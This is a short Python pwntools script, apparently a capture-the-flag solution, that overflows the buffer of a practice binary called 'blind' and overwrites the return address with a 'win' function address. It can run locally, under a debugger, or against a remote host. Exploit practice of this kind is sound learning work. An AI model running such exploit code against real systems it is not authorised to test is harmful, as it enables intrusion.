from pwn import *


PROGRAM_PATH = (Path(__file__).parent / "blind").resolve().__str__()
BUFF_SIZE = 0x40 + 8
# now ADD eight bytes for the return address

# BUFF_SIZE = 0x88
# CANARY = 123456789
win_addr = 0x401196

gdb_script = """
b *main
b *vuln+42
b *vuln+54
c
"""


# FullPath
print(f"Program path is: {PROGRAM_PATH}")
print("____________________________________")


# TODO: Add the ip address here later!
def start(argv=[], *a, **kwargs):
    if args.GDB:
        return gdb.debug([PROGRAM_PATH] + argv, gdbscript=gdb_script, *a, **kwargs)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kwargs)
    else:
        return process([PROGRAM_PATH] + argv, *a, **kwargs)


io = start()
res = io.recvlines(1)
print("____________________________________")
print(res)

le = p64(win_addr)
be = p64(win_addr, endianness="big")
payload = b"A" * BUFF_SIZE + le
print(f"Sending payload: {payload}")

io.sendline(payload)
io.interactive()
